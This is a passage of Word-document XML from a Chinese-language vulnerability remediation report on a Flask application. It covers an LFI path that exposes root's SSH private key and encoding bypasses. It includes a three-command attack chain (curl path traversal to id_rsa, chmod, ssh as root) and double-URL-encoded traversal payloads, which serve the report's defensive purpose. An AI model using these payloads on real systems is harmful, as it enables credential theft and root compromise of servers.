        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-522: Insufficiently Protected Credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由的 LFI 目录穿越漏洞未做任何路径过滤，攻击者可通过 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>name=../../root/.ssh/id_rsa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 直接读取 root 用户的 SSH 私钥文件。由于 Flask 应用以 root 权限运行（端口 5000），私钥文件权限可被进程读取。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Step 1: 通过 LFI 读取 SSH 私钥</w:t>
        <w:br/>
        <w:t>$ curl "http://target/page?name=../../root/.ssh/id_rsa"</w:t>
        <w:br/>
        <w:t>-----BEGIN OPENSSH PRIVATE KEY-----</w:t>
        <w:br/>
        <w:t>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</w:t>
        <w:br/>
        <w:t>...（完整私钥内容泄露）</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 2: 保存私钥并设置权限</w:t>
        <w:br/>
        <w:t>$ chmod 600 id_rsa</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 3: SSH 登录服务器</w:t>
        <w:br/>
        <w:t>$ ssh -i id_rsa root@target</w:t>
        <w:br/>
        <w:t>root@target:~#   ← 已获得服务器 root shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>整个攻击过程仅需 3 条命令，耗时不超过 10 秒即可完成从信息窃取到服务器提权的全过程。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 服务器操作系统级别沦陷</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：攻击者获得完整的 root shell，可执行任意系统命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 持久后门植入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：可安装 SSH 后门、Rootkit、挖矿程序、勒索软件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 内网横向移动</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：以本机为跳板，扫描攻击同网段其他服务器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 数据全量窃取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：所有数据库、文件、配置、密码哈希均可被拖走</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 业务完全被控</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：可删除/篡改/加密所有业务数据，导致服务瘫痪</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>该漏洞由漏洞 1（LFI 目录穿越）直接导致。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>LFI 白名单修复后，所有目录穿越请求均被阻断</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，SSH 私钥无法再通过 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接口读取。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>curl /page?name=../../root/.ssh/id_rsa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>不返回私钥内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>检查私钥文件是否存在于 pages/ 目录</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>不存在</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 安全</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 3】路径编码绕过（CWE-174）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page?name={encoded_path}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-174: Double Decoding of the Same Data</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由仅做简单的字符串拼接，未对用户输入进行归一化和规范化处理。Flask 框架会自动对 URL 参数进行一次 URL 解码，而操作系统文件路径解析时又会进行第二次解码，这种多层解码机制使得攻击者可通过编码变换绕过假设中的黑名单过滤。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">攻击者可以构造以下多种绕过 payload，每种均能绕过常规的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>../</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关键字黑名单：</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>绕过方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>攻击示例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>绕过原理</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>双层 URL 编码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>%252e%252e%252f</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> → Flask 解码为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>%2e%2e%2f</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> → open() 解码为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>利用 Flask + 系统的双重 URL 解码</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>双斜杠绕过</w:t>
